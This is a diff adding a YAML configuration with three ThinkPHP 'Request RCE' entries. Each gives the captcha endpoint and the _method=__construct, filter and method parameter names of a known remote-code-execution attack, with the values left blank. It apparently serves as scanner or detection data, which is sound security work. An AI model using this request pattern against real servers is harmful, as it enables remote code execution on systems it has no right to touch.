@@ -1,0 +1,36 @@
+models:
+  - ThinkPHP1:
+    info: "ThinkPHP Request RCE"
+    cveid: ""
+    reference: "https://www.o2oxy.cn/2080.html"
+    method: "POST"
+    status: true
+    url: "/index.php?s=captcha"
+    keys:
+      _method: "__construct"
+      filter[]: ""
+      server[REQUEST_METHOD]: ""
+
+  - ThinkPHP2:
+    info: "ThinkPHP Request RCE"
+    cveid: ""
+    reference: "https://www.o2oxy.cn/2080.html"
+    method: "POST"
+    status: true
+    url: "/index.php?s=captcha"
+    keys:
+      _method: "__construct"
+      method: ""
+      filter[]: ""
+
+  - ThinkPHP3:
+    info: "ThinkPHP Request RCE"
+    cveid: ""
+    reference: "https://www.o2oxy.cn/2080.html"
+    method: "POST"
+    status: true
+    url: "/index.php?s=captcha"
+    keys:
+      _method: "__construct"
+      filter: ""
+      method: ""
